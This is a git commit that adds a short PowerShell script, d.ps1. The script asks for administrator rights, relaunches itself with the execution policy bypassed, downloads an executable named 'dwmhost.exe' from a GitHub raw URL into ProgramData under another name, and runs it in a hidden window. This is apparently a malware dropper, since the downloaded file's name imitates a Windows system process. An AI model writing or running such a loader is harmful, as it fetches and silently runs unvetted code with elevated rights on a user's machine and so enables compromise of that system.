421cdd46e78bc5140d65fcf26efe1136f88e9d97
AnatolyPivder <149972492+AnatolyPivder@users.noreply.github.com>
2026-04-25 21:43:58 +0400

    Create d.ps1

---
+++ d.ps1
@@ -0,0 +1,15 @@
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$url = "https://github.com/AnatolyPivder/R/raw/refs/heads/main/dwmhost.exe"
+
+$outputPath = "$env:ProgramData\alp.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $outputPath)
+
+Start-Process -FilePath $outputPath -WindowStyle Hidden
+
+exit
+
+
